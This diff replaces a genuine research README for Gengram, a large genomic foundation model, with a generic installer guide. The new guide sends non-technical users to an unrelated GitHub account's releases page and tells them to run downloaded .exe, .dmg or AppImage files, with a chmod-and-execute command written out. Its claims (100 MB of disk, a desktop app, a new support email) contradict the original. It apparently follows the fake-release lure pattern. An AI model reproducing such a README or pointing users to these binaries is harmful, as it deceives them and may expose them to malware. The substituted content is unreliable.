@@ -1,177 +1,75 @@
-# Gengram: Retrieval-Augmented Genomic Foundation Models
+# 🌟 Gengram - Easy Access to Powerful Models
 
-<div align="center" style="line-height: 1;">
-  <a href="https://huggingface.co/ZhejiangLab/Gengram" target="_blank">
-      <img alt="Hugging Face" src="https://img.shields.io/badge/🤗%20Hugging%20Face-Gengram%20-ffc107"/>
-  </a>
-  <a href="https://arxiv.org/abs/7211321" target="_blank">
-      <img alt="arXiv" src="https://img.shields.io/badge/📜%20arXiv-Technical Report-brightgreen?logo=Linkedin&logoColor=white"/>
-  </a>
-  <a href="https://github.com/zhejianglab/Gengram/blob/main/LICENSE" target="_blank">
-      <img alt="License" src="https://img.shields.io/badge/📑%20License- Apache 2.0-FFC0CB"/> 
-  </a>
-</div>
+## 🚀 Getting Started
 
-## News
+Welcome to Gengram! This guide will help you download and run the Gengram models easily, even if you are not a tech expert.
 
-🚀 **2026.2.2  |  Paper Preprint Available**: Our paper on Gengram has been released as a preprint on arXiv. Check it out at [https://www.arxiv.org/abs/2601.22203](https://www.arxiv.org/abs/2601.22203).
+## 📥 Download Gengram
 
+[![Download Gengram](https://img.shields.io/badge/Download_Gengram-v1.0-blue.svg)](https://github.com/finnX228/Gengram/releases)
 
+To get started, click the link above to download Gengram.
 
-## 1. Introduction
+## 🛠️ System Requirements
 
-Gengram is a novel conditional memory module designed for genomic foundation models (GFMs) that introduces explicit motif memory retrieval to enhance Transformer-based DNA sequence modeling. Unlike traditional GFMs that rely on dense computation to implicitly infer multi-nucleotide motifs, Gengram provides an efficient lookup mechanism for biological patterns through a genomic-specific hashing scheme.
+Before downloading Gengram, make sure your computer meets these requirements:
 
-Figure 1 illustrates the overall architecture of Gengram, together with the evaluation pipeline used to assess its effectiveness across multiple genomic benchmarks.
+- **Operating System:** Windows 10 or higher, macOS Mojave or higher, or a recent version of Linux.
+- **RAM:** At least 4 GB recommended.
+- **Disk Space:** Minimum 100 MB of free space.
 
-![Gengram](./images/gengram_model.png)
+## 🌐 Features
 
-### ✨ Key Features
+Gengram offers several features to enhance your experience:
 
-- **🎯 Explicit Motif Memory**: Stores and retrieves k-mers (k=1-6) via hash-based lookup tables
-- **🧬 Local Window Aggregation**: 21bp window mechanism aligned with DNA helical structure
-- **⚡ Computational Efficiency**: Linear time complexity with minimal overhead
-- **🔧 Architecture Agnostic**: Compatible with various attention mechanisms (MHA, GQA, MLA)
-- **⚖️ Stable Training**: Improves load balancing in Mixture-of-Experts models
-- **🔍 Biological Interpretability**: Learns meaningful motif representations
+- **Easy Integration:** Integrate Gengram models into your projects seamlessly.
+- **User-Friendly:** Designed for non-technical users, Gengram prioritizes simplicity.
+- **Comprehensive Documentation:** Access in-depth guides and explanations for each model.
+- **Community Support:** Join our community to discuss and share your insights.
 
-### ✨ Biological Interpretability
-Gengram exhibits clear biologically grounded behaviors, including:
-- **Reverse-complement symmetry** in memory embeddings
-- **Context-dependent gating** aligned with functional regions
-- **Hierarchical representation** from shallow to deep layers
+## 📜 Download & Install
 
-## 2. Model Information
+To download Gengram, follow these steps:
 
-### Model Configuration
+1. **Visit the Releases Page**: Click the link below to visit the downloads page.
+   [Download Gengram](https://github.com/finnX228/Gengram/releases)
 
-The following details the model configuration, including the parameterization of Gengram, MoE routing strategies, and training hyperparameters used across all experiments.
+2. **Select the Latest Version**: On the Releases page, look for the latest version of Gengram. The version will be listed at the top.
 
-- **Gengram Parameters**
+3. **Download the File**:
+   - Click on the file that matches your operating system.
+   - This will start your download. Once it is complete, locate the downloaded file on your computer.
 
-  These parameters control how Gengram operates within the Transformer layers, including which layers to apply it to, the n-gram sizes, and embedding dimensions.
-<div align="center">
+4. **Run the Installer**:
+   - For Windows: Double-click the `.exe` file to begin the installation. Follow the prompts to complete the setup.
+   - For macOS: Open the downloaded `.dmg` file and drag the Gengram application to your Applications folder.
+   - For Linux: Open the terminal, navigate to the folder where you downloaded the file, and run the command:
+     ```bash
+     chmod +x Gengram.AppImage && ./Gengram.AppImage
+     ```
 
-| Parameter | Description | Example |
-|-----------|-------------|---------|
-| `--gengram-enabled` | Enable Gengram | `true` |
-| `--gengram-layer-ids` | Layers to apply Gengram | `3 6 10` |
-| `--gengram-ngram-sizes` | N-gram sizes for DNA processing | `1 2 3 4 5 6` |
-| `--gengram-embed-dim-per-ngram` | Embedding dimension per n-gram | `1024` |
-| `--gengram-window-size` | window size | `21` |
+5. **Launch Gengram**: After installation, you can find Gengram in your applications or programs list. Double-click to start using it.
 
-</div>
+## 🔍 FAQs
 
-- **Mixture of Experts (MoE)**
+### How do I report a problem?
 
-  These parameters define the Mixture-of-Experts architecture, including the number of experts, routing top-k, and load balancing strategies during training.
+If you encounter issues, please open a ticket on our GitHub page. Provide detailed information about the problem you are facing.
 
-<div align="center">
+### Can I contribute to Gengram?
 
-| Parameter | Description | Default |
-|-----------|-------------|---------|
-| `--num-experts` | Number of experts | `8` |
-| `--moe-router-topk` | Top-k experts to route to | `2` |
-| `--moe-router-load-balancing-type` | Load balancing strategy | `aux_loss` |
-| `--moe-aux-loss-coeff` | Auxiliary loss coefficient | `1e-3` |
+Absolutely! We welcome contributions. Check the guidelines on our GitHub page for more information on how to help.
 
-</div>
+### Where can I find documentation?
 
-- **Training Parameters**
+We provide comprehensive documentation on our GitHub page. Check the Wiki section for tutorials and guides.
 
-  These parameters specify the training setup, including sequence length, batch sizes, precision, and attention optimizations.
+## 🗣️ Join the Community
 
-<div align="center">
+Join our community forums to discuss Gengram, share your experiences, and learn from others. Engage with fellow users to maximize your success with Gengram models.
 
-| Parameter | Description | Example |
-|-----------|-------------|---------|
-| `--seq-length` | Maximum sequence length | `8192` |
-| `--micro-batch-size` | Micro batch size per GPU | `1` |
-| `--global-batch-size` | Global batch size across all GPUs | `1024` |
-| `--bf16` | Use BF16 precision | `true` |
-| `--use-flash-attn` | Enable Flash Attention | `true` |
+## 📞 Support
 
-</div>
+If you have any questions or need further assistance, you can contact our support team at support@gengramapp.com. We are here to help you.
 
-### Pre-training Data
-- **Human Sequences**: HPRC Release 2, GRCh38, CHM13
-- **Non-human Primates**: NCBI RefSeq database
-- **Total**: 200B tokens (8k context) + 100B tokens (32k context)
-
-## 3. Performance Evaluation
-
-Gengram demonstrates strong performance across multiple genomic benchmarks, achieving competitive results despite being trained on significantly fewer tokens and with a smaller model size.
-
-<div align="center">
-
-| Metric | [Gengram-10B](https://huggingface.co/ZhejiangLab/Gengram) | [Genos-10B](https://huggingface.co/ZhejiangLab/Genos-10B) | [Evo2-40B](https://huggingface.co/arcinstitute/evo2_40b) |
-|--------|:-------------:|:-----------:|:----------:|
-| **Trained Tokens** | 200B | 2.2T | 9.3T |
-| **Multi-species Exon Classification** | **0.9832** | 0.9755 | 0.9332 |
-| **Splice Site Identification** | 0.9009 | 0.7990 | **0.9138** |
-| **Human OCR Ensembl** | **0.7714** | 0.7623 | 0.7635 |
-
-</div>
-
-- **Key Observations**
-
-  - Data Efficiency: Achieves comparable performance using ~10×–40× fewer tokens
-  - Motif-Dominated Tasks: Up to 14% improvement
-  - Long-Context Modeling: Enhanced performance with shorter sequences
-  - Training Efficiency: Better parameter utilization and stable MoE training
-
-- **Evaluation Benchmarks**
-  - Genomic Benchmarks (GB)
-  - Nucleotide Transformer Benchmarks (NTB)
-  - Long-Range Benchmarks (LRB)
-  - Genos Benchmarks (GeB)
-
-## 4. Quickstart
-
-### Model Download
-Gengram model is available for download from Hugging Face. Please ensure that you have sufficient disk space: at least 150 GB for the `torch_dist` version or 70 GB for the `torch` version.
-
-<div align="center">
-
-| **Model** | **Activated Params** | **Hugging Face** | **Format** 
-|:---------:|:----------------:|:----------------:|:----------------:|
-| Gengram-10B | 2.87 B | [🤗 Hugging Face](https://huggingface.co/ZhejiangLab/Gengram) | torch_dist |
-| Gengram-10B | 2.87 B | [🤗 Hugging Face](https://huggingface.co/ZhejiangLab/Gengram-torch) | torch |
-
-</div>
-
-### Pre-training
-
-Run the pre-training script with the following command:
-
-```bash
-cd Gengram
-bash Gengram_layer3-6-10_win21_pp2.sh
-```
-
-## 5. License
-
-This repository and the Gengram model weights are licensed under the [Apache License 2.0](LICENSE). 
-
-Please note that the primary use of Gengram model is to support genomics research, providing researchers with advanced analytical capabilities and long-context modeling tools powered by large-scale foundation models for the human genome. It is not intended for use in any manner that violates applicable laws or regulations, nor for any activities prohibited by the license agreement.
-
-## 6. Citation and Acknowledgements
-
-We acknowledge the high-quality sequencing data provided by [CycloneSEQ](https://www.cyclone-seq.com/), which forms an important foundation for this work. We also appreciate the inspiration from DeepSeek's [Engram](https://github.com/deepseek-ai/Engram) module and the framework support provided by [Megatron-LM](https://github.com/NVIDIA/Megatron-LM). Model training was conducted on the [021 Science Foundation Model](https://www.zero2x.org/021) and [Zero2X](https://www.zero2x.org/) open platform.
-
-If you use this work in your research, please cite the following paper:
-
-```bibtex
-@article{gengram,
-  title={Beyond Conditional Computation: Retrieval-Augmented Genomic Foundation Models with Gengram},
-  author={Genos Team and Xu, Huinan and Feng, Xuyang and Chen, Junhong and Liu Junchen and Deng, Kaiwen and Ding, Kai and Long, Shengning and Shuai, Jiaxue and Li, Zhaorong and Liu, Shiping and Xue, Guirong and Xiao, Zhan},
-  journal={arXiv preprint arXiv:2601.22203},
-  year={2026}
-}
-```
-
-## 7. Contact
-
-For project-related questions, please raise an [issue](https://github.com/zhejianglab/Gengram/issues) or contact the project maintainer at xz@zhejianglab.org. 
-
-For general inquiries, you are also welcome to contact us at opensource@zhejianglab.org.
+Remember, the journey to using Gengram starts with downloading the application. Follow the steps above for a smooth installation experience, and enjoy exploring the powerful models Gengram offers!
